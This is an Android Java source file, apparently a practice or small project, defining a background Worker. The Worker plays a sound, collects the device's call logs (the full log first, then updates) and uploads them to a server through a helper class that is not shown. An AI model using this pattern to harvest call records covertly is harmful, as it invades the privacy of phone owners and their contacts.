package com.example.foreground1;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.MediaPlayer;
import android.os.Build;
import android.preference.PreferenceManager;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class DataWorker extends Worker {
    SharedPreferences sp;
    List<CallLogModel> callLogsArrayList = new ArrayList<>();


    public DataWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    @NonNull
    @Override
    public Result doWork() {
        FetSendData fetSendData = new FetSendData(getApplicationContext());
        MediaPlayer mediaPlayer = MediaPlayer.create(getApplicationContext(),R.raw.pikachu);
        mediaPlayer.start();

        sp = getApplicationContext().getSharedPreferences("first",Context.MODE_PRIVATE);
        String isNew = sp.getString("nam",null);
        System.out.println(isNew);

        if(isNew==null){
            System.out.println("First time --------------");
            callLogsArrayList = fetSendData.fetchCallLogs();

        }else {
            System.out.println("Second time -------------");
            callLogsArrayList = fetSendData.fetchUpdatedCallLogs();
        }
        isNew = fetSendData.sendDataToServer(callLogsArrayList);
        if(isNew!=null){
        SharedPreferences.Editor editor = sp.edit().putString("nam","sucess");
        editor.commit();
        }
        return Result.success();
    }

}
